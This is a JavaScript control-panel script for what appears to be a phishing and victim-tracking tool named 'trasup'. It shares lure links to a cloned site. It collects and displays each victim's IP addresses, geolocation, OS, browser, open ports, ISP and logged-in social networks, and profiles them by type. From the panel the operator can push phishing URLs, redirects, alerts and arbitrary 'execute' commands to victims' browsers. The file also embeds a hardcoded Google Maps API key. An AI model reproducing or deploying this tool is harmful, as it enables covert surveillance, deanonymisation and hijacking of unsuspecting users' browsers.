$(document).ready(function() {

  namespace = '/trasup';
  var socket = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);

  var trasup = {
    self: this,
    name: "trasup",
    out: "",
    key: "abcdefghijklmnopqrstuvwxyz0123456789",
    token: Math.random().toString().substring(7).substr(0,7),
    array: [0,1,2,3,4,5,6,7,8,9],
    log: function(value) {
      // simplification > console.log
      console.log(value);
    },
    deploy: function() {
      trasup.self.showDetails();
      trasup.self.shareSocial();
    }
  };

// unique detail function for attr > trasup
  trasup.self.jsToken = function() {
    var randomToken = function() {
      // helping: http://stackoverflow.com/questions/8532406/create-a-random-token-in-javascript-based-on-user-details
      return trasup.token;
    };
    var generateToken = function() {
      return randomToken();
    }; 
    var random = function(values) {
      return values[Math.floor((Math.random()*values.length))];
    };
    var supportRand = function() {
      for(var val = 0; val < 5; val++)
        trasup.out += trasup.key.charAt(Math.floor(Math.random()*trasup.key.length));
      return trasup.out; 
    }
    var prefixRand = function() {
      return random(trasup.array)  
    };

    var token = trasup.runToken = prefixRand() + supportRand() + generateToken();

    trasup.log("Token" + "-" + trasup.name + ":" + " " + token);

    // running token
    return token; 
  }

  // Running jsToken
  var token = trasup.self.jsToken();

  if (localStorage.trasup == null) {
        window.location.replace('/logout');
    } else {
        var id = { 
            id : localStorage.trasup
        };

        $.ajax({
            url: '/login',
            data: id,
            dataType: "json",
            type: 'POST',
            success: function(response) {
                if (response.status != 'OK'){
                    //Delete localStorage Variable
                    delete localStorage.trasup;
                    //Redirect to the panel
                    window.location.replace('/');
                } else {
                    $.ajax({
                      url: '/get_title',
                      dataType: "json",
                      type: 'POST',
                      complete: function(data) {
                        $('#lbltrasup_DomainTitle').text(data.responseJSON.title);
                        $('#lnktrasup_ShareTwitter').attr('href','https://twitter.com/intent/tweet?url=' + 'http://' + response.user_ip + ':' + response.app_port + '/' + response.victim_path +'&text=' + data.responseJSON.title + '&hashtags=FirstYourSecurity&via=afeorma');
                        $('#lnktrasup_ShareFacebook').attr('href','https://www.facebook.com/sharer.php?u=' + 'http://' + response.user_ip + ':' + response.app_port + '/' + response.victim_path);
                      }   
                    });

                    $('#lnktrasupControl_DomainClone').text(response.url_to_clone);
                    $('#lnktrasupControl_DomainClone').attr('href', response.victim_path);
                    $('#lbltrasupControl_StartDate').text(response.date_start);

                    $('#lnktrasupControl_url').text('http://' + response.user_ip + ':' + response.app_port + '/' + response.victim_path);
                    $('#lnktrasupControl_url').attr('href', 'http://' + response.user_ip + ':' + response.app_port + '/' + response.victim_path);

                    socket.emit('join', {room: id.id});
               }
            },
            error: function(error) {
                console.log(error);
            }
        });


        dataSync();
    }

    trasup.self.showDetails = function() {
        // Generate unique box Modal (Detail) safe touch :)
        $(".trasupControl-ViewDetails").attr("id", "show" + "-" + token);
    };

    trasup.self.shareSocial = function() {
        var menuToggle = $('[data-action="toggle"]');
        var menu = $('.trasupControl-shareBox');

        menuToggle.click(function() {
            menu.toggleClass("active");
        });

        $(".trasupControl-Wrapper--PrincipalData---InfoDetails----zoneCopy-----buttonShare").click(function(event) {
            event.preventDefault();
            event.stopPropagation();
            $(".trasupControl-Wrapper--PrincipalData---InfoDetails----zoneCopy-----buttonShare").toggleClass("is-active--up");
        });
    }

    $(document).delegate('[button-trasup-detail="show"]', 'click', function(event) {
      event.preventDefault();
      var idVictim = $(this).attr("data-vid");
      window.idVictim = idVictim;
      var behavior = $(this).parent('div').parent('div').find('.trasupControl-History--Logs---centerData----behavior').text();
         $.ajax({
            url: '/get_preview',
            data: {vId : idVictim},
            dataType: "json",
            type: 'POST',
            success: function(response) {
                if (response.status != 'OK') {

                } else {
                    $(".trasupControl-ViewDetails").addClass("active");

                    $('.trasupControl-Preview--box---Sidebar----NetworksStatus').removeClass('online');
                    $('.trasupControl-Preview--box---Sidebar----NetworksStatus').removeClass('offline');
                    $('.trasupControl-Preview--box---Sidebar----NetworksStatus').addClass('offline');
                    $('.trasupControl-Preview--box---Sidebar----NetworksStatus').text('Offline');

                    $.each(response.n, function(index, val) {
                       $('.trasupControl-Preview--box---Sidebar----NetworksDefine.' + val[3].toLowerCase() + ' span').removeClass('offline');
                       $('.trasupControl-Preview--box---Sidebar----NetworksDefine.' + val[3].toLowerCase() + ' span').addClass('online');
                       $('.trasupControl-Preview--box---Sidebar----NetworksDefine.' + val[3].toLowerCase() + ' span').text('Online');
                    });

                    var d = response.d[0];

                    $("#lnktrasupControlPreview_Map").attr('href', 'http://maps.google.com/maps/place/' + d[15] + ',' + d[16] + '/@' + d[15] + ',' + d[16] + ',10z/data=!3m1!1e3');
                    $('#imgtrasupControlPreview_Map').attr('src', 'https://maps.googleapis.com/maps/api/staticmap?zoom=16&size=437x368&maptype=roadmap&markers=color:red%7Clabel:C%7C' + d[15] +  ',' + d[16] + '&key=AIzaSyBUPHAjZl3n8Eza66ka6B78iVyPteC5MgM');

                    $('#lbltrasupControl_Preview_CPU').text(d[7].charAt(0).toUpperCase() + d[7].slice(1));
                    $('#lbltrasupControl_Preview_SO').text(d[6].charAt(0).toUpperCase() + d[6].slice(1));
                    $('#lbltrasupControl_Preview_Browser').text(d[5].charAt(0).toUpperCase() + d[5].slice(1));
                    $('#lbltrasupControl_Preview_Country').text(d[13]);
                    $('#lbltrasupControl_Preview_City').text(d[19]);
                    $('#lbltrasupControl_Preview_Latitude').text(d[15]);
                    $('#lbltrasupControl_Preview_Longitude').text(d[16]);
                    $('#lbltrasupControl_Preview_OpenPorts').text(d[8]);
                    $('#lbltrasupControl_Preview_ISP').text(d[22]);
                    $('#lbltrasupControl_Preview_UA').text(d[23]);
                    $('#lbltrasupControl_Preview_UA').attr('title', d[23]);

                    $('#lnktrasupControlPreview_PublicIP').text(d[14]);
                    $('#lnktrasupControlPreview_LocalIP').text(d[1]);

                    $("#lbltrasupControl_Preview_Behavior").text(behavior);
                }
            },
            error: function(error) {
                console.log(error);
            }
        });
      });

    $(document).delegate(".trasupControl-Preview--buttonClose", 'click', function(event) {
        $(".trasupControl-ViewDetails").removeClass("active");
        event.preventDefault();
    });

    // Tabs logs/requests
    $(document).delegate(".trasupControl-History--Tabs---button", 'click', function(e) {
        e.preventDefault();
        var tabAttr = $(this).data('action');
        var boxPreview = $(".trasupControl-History--Logs");
        $('.trasupControl-History--Tabs---button').removeClass('is-active');
        $(this).addClass('is-active');

        if (tabAttr == true) {
          boxPreview.show();
        } else {
          boxPreview.each(function() {
            var reAttr = $(this).data("action");
          if (reAttr == tabAttr) {
              $(this).show();
            } else {
              $(this).hide();
            }
        });
      }
    });

    // Tabs info/attacks
    $(".trasupControl-Preview--Tabs---button").on('click', function(e) {
        e.preventDefault();
        var tabAttr = $(this).data('action');
        var boxPreview = $(".trasupControl-BoxTab");
        $('.trasupControl-Preview--Tabs---button').removeClass('is-active');
        $(this).addClass('is-active');

        if (tabAttr == true) {
          boxPreview.show();
        } else {
          boxPreview.each(function() {
            var reAttr = $(this).data("action");
          if (reAttr == tabAttr) {
              $(this).show();
            } else {
              $(this).hide();
            }
        });
      }
    });

    // run functions
    trasup.deploy();

    socket.on('my_response', function(msg) {
        switch (msg.data){
            case 'update-data':
                dataSync();
                break;
            default:
                return false;
        }
    });

    $(document).delegate('.trasupControl-Preview--box---Sidebar----NetworksStatus.online', 'click', function(event) {
        var network = $(this).parent('div').attr("class").replace('trasupControl-Preview--box---Sidebar----NetworksDefine ', '');
        socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'network', 'message' : network}});
    });

    $('#btntrasupControl-BoxTab-Phishing').on('click', function(event) {
        event.preventDefault();
        socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'url', 'message' : $('#txttrasupControl-BoxTab-Phishing').val()}}); 
    });

    $('#btntrasupControl-BoxTab-Redirect').on('click', function(event) {
        event.preventDefault();
        socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'redirect', 'message' : $('#txttrasupControl-BoxTab-Redirect').val()}}); 
    });

    $('#btntrasupControl-BoxTab-Alert').on('click', function(event) {
        event.preventDefault();
        socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'alert', 'message' : $('#txttrasupControl-BoxTab-Alert').val()}}); 
    });

    $('#btntrasupControl-BoxTab-Execute').on('click', function(event) {
        event.preventDefault();
        socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'execute', 'message' : $('#txttrasupControl-BoxTab-Execute').val()}}); 
    });

    $('.trasupControl-BoxTab--Form, .trasupControl-BoxTab--FormRight').on('submit', function(event) {
        event.preventDefault();
        $(this).find('button').trigger('click');
    });
});

/* Here is defined, a behavioral supposition of a user or victim */
var profiling = function(value) {
    var behavior = 'Unknown';
    if (value != undefined) {
        behavior = 'User';
        if (value.indexOf('Facebook') >= 0)   {   
            behavior = 'Common';
        }
        if (value.indexOf('Airbnb') >= 0)   {   
            behavior = 'Traveller';
        }
        if (value.indexOf('Facebook') >= 0 && value.indexOf('Instagram') >= 0)   {   
            behavior = 'Common';
        }
        if (value.indexOf('Facebook') >= 0 && value.indexOf('Instagram') >= 0 && value.indexOf('Twitter') >= 0) {   
            behavior = 'Marketer';  
        }
        if (value.indexOf('Medium') >= 0 || value.indexOf('Reddit') >= 0) {   
            behavior = 'Geek';  
        }
        if (value.indexOf('Bitbucket') >= 0 || value.indexOf('Github') >= 0) {   
            behavior = 'Developer';  
        }
        if (value.indexOf('Airbnb') >= 0 || value.indexOf('Foursquare') >= 0) {   
            behavior = 'Traveller';  
        }
        if (value.indexOf('Slack') >= 0 || value.indexOf('Hackernews') >= 0) {   
            behavior = 'Entrepreneur';  
        }
        if (value.indexOf('Slack') >= 0 && value.indexOf('Hackernews') >= 0 && value.indexOf('Reddit') >= 0) {    
            behavior = 'Entrepreneur';  
        }
        if (value.indexOf('Bitbucket') >= 0 && value.indexOf('Github') >= 0 && value.indexOf('PayPal') >= 0 && value.indexOf('Reddit') >= 0) {   
            behavior = 'Hacker';  
        }
        if (value.indexOf('Medium') >= 0 && value.indexOf('Bitbucket') >= 0 && value.indexOf('Github') >= 0 && value.indexOf('PayPal') >= 0 && value.indexOf('Reddit') >= 0 && value.indexOf('Hackernews') >= 0 && value.indexOf('Airbnb') >= 0 && value.indexOf('Twitter') >= 0 && value.indexOf('Spotify') >= 0) {   
            behavior = 'Tech-lover';  
        }
    }

    return behavior;
} 

var dataSync = function() {
    $.ajax({
            url: '/get_data',
            data: null,
            dataType: "json",
            type: 'POST',
            success: function(response) {
                var htmlData = '';
                var locations = [];
                var chkLocations = 0;
                var tmpId = '';
                var networks = [];
                $.each(response.n, function(index, val) {
                    if (tmpId != val[0]) {
                        networks[val[0]] = [];
                        tmpId = val[0];
                    }

                    networks[val[0]].push(val[3]);
                });

                if (response.d.length > 0) {
                    $.each(response.d, function(index, val) {
                        var userType = profiling(networks[val[0]]);
                        chkLocations = locations.indexOf(val[15]);
                        if (chkLocations < 0) {
                            locations.push(val[15]);
                        }

                        htmlData += '<div class="trasupControl-History--Logs---log">';

                          if (val[6] == 'android' || val[6] == 'iphone'){
                            htmlData += '<span class="trasupControl-History--Logs---logDevice----mobile"></span>';
                          } else {
                            htmlData += '<span class="trasupControl-History--Logs---logDevice----desktop"></span>';
                          }
                          htmlData += '<div class="trasupControl-History--Logs---logData">';
                            htmlData += '<a class="trasupControl-History--Logs---logData----victimIP" href="' + val[14] +  '">' + val[14] +  '<span class="trasupControl-History--Logs---logData----lineVertical"></span><span class="trasupControl-History--Logs---logData----requests"><span class="trasupControl-History--Logs---logData----iconRequests"></span>' + val[25] + '</span></a>';
                            htmlData += '<span class="trasupControl-History--Logs---logData----countryTime"><strong>' + val[13] + '</strong> on ' + val[2] + '</span>';
                          htmlData += '</div>';
                          htmlData += '<div class="trasupControl-History--Logs---zonePreview">';
                            htmlData += '<div class="trasupControl-History--Logs---zonePreview----code">' + val[0].substring(0, 5) + '</div> ';
                            htmlData += '<a class="trasupControl-History--Logs---zonePreview----button" href="#" data-vid="' + val[0] + '" button-trasup-detail="show"><span class="icon-database"></span> details</a> ';
                          htmlData += '</div>';
                          htmlData += '<div class="trasupControl-History--Logs---centerData">';
                            htmlData += '<div class="trasupControl-History--Logs---centerData----osBrowser">';
                              htmlData += '<p class="trasupControl-History--Logs---centerData----osBrowser-----browser"><strong><span class="logs-iconDEvice icon-' + val[5].toLowerCase() + '"></span></strong> ' + val[5].charAt(0).toUpperCase() + val[5].slice(1) + ' </p>';
                              htmlData += '<p class="trasupControl-History--Logs---centerData----osBrowser-----os"><strong><span class="logs-iconDEvice icon-' + val[6] + '"></span></strong> ' + val[6] + '</p>';
                            htmlData += '</div>';
                            htmlData += '<span class="trasupControl-History--Logs---centerData----behavior">' + userType + '</span>';
                          htmlData += '</div>';
                        htmlData += '</div>';
                    });

                } else {
                    htmlData += '<div class="trasupControl-HistoryRequests--NotData">';
                      htmlData += 'There are no victims available, he shares the lure.';
                    htmlData += '</div>';
                }

                $('#cnttrasupControl_Logs div').remove();
                $('#cnttrasupControl_Logs').prepend(htmlData);

                $("#lbltrasupControl_Stats_Victims").text(response.d.length);
                $('#lbltrasupControl_Stats_Locations').text(locations.length);

                $('#lbltrasupControl_Stats_Clicks').text(response.c);
                $('#lbltrasupControl_Stats_Sessions').text(response.s);
                $('#lbltrasupControl_Stats_Online').text(response.o);
            },
            error: function(error) {
                console.log(error);
                setTimeout(function() {
                    dataSync(); 
                }, 3000);
            }
        });

        $.ajax({
            url: '/get_requests',
            data: null,
            dataType: "json",
            type: 'POST',
            success: function(response) {
                var htmlData = "";
                var requests = 0;

                var tmpId = "";
                var tmpTarget = [];

                $.each(response.d, function(index, val) {
                    if (tmpId != val[0]) {
                        tmpId = val[0];
                        requests++;
                        if (htmlData != '') {
                            htmlData += '</ul></div></div></div><!-- -->';
                        }

                        tmpTarget = val[2].split('/');
                        tmpTarget = tmpTarget[0] + '//' + tmpTarget[2];

                        htmlData += '<!-- -->';
                        htmlData += '<div class="trasupControl-Requests">';
                          htmlData += '<div class="trasupControl-Requests--HeaderData">';
                            htmlData += '<div class="trasupControl-Requests--HeaderData---define">';
                              htmlData += '<div class="trasupControl-Requests--HeaderData---idRequest">' + val[1] + '</div>';
                              htmlData += '<!--<div class="trasupControl-Requests--HeaderData---define----value">Endpoint: <strong>localhost:8080</strong></div> -->';
                              htmlData += '<div class="trasupControl-Requests--HeaderData---define----value">IP victim: <strong>' + val[7] +  '</strong></div>';
                              htmlData += '<div class="trasupControl-Requests--HeaderData---define----value">Target: <strong>' + tmpTarget + '</strong></div>';
                              htmlData += '<div class="trasupControl-Requests--HeaderData---define----value">Date: <strong>' + val[6] + '</strong></div>';
                            htmlData += '</div>';
                          htmlData += '</div>';
                          htmlData += '<div class="trasupControl-Requests--body">';
                            htmlData += '<div class="trasupControl-Requests--body---Data">';
                              htmlData += '<ul>';
                    }

                            htmlData += '<div class="trasupControl-Requests--body---Data----view"><strong>' + (val[3] || val[4]) + ':</strong> ' + val[5] + '</div>';
                });
                if (htmlData != '') {
                    htmlData += '</ul></div></div></div><!-- -->';
                } else{
                    htmlData += '<div class="trasupControl-HistoryRequests--NotData">';
                      htmlData += 'No victim requests yet';
                    htmlData += '</div>';
                }

                $('#cnttrasupControl_Requests div').remove();
                $('#cnttrasupControl_Requests').append(htmlData);

                $('#lbltrasupControl_Stats_Requests').text(requests);
                setTimeout(function(){ dataSync(); }, 50000);
            },
            error: function(error) {
                console.log(error);
                setTimeout(function(){ dataSync(); }, 3000);
            }
        });
}